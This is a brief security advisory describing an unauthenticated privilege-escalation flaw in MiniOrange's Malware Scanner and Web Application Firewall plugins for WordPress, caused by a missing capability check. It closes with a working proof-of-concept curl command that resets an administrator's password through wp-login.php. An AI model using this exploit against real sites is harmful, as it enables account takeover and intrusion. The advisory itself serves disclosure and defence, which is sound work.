Description
The Malware Scanner plugin and the Web Application Firewall plugin for WordPress (both by MiniOrange) are vulnerable to privilege escalation due to a missing capability check on the mo_wpns_init() function in all versions up to, and including, 4.7.2 (for Malware Scanner) and 2.1.1 (for Web Application Firewall).<br>
This makes it possible for unauthenticated attackers to escalate their privileges to that of an administrator.

curl --url 'http://your-site.tld/wp-login.php' --data 'option=mo_wpns_change_password&username=simpleadmin&new_password=P4ssw0rd!&confirm_password=P4ssw0rd!'

